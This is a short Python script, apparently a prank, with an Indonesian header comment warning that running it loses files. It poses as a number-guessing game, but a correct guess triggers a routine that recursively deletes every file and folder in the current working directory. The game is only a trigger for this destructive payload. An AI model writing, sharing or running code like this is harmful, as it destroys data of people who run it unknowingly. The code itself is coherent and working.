# INI JANGAN ASAL RUN KALO GA NGERTI, NTAR ILANG FILE, BUKAN SALAH GW

import random
import os, shutil

angkaAcak = random.randrange(1, 6, 1)
folder = os.getcwd()+'/'

while True:
    tebakan = int(input("Tebak angka "))
    
    if tebakan == angkaAcak:
        print("Babay")
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                print('Failed to delete %s. Reason: %s' % (file_path, e))
        break
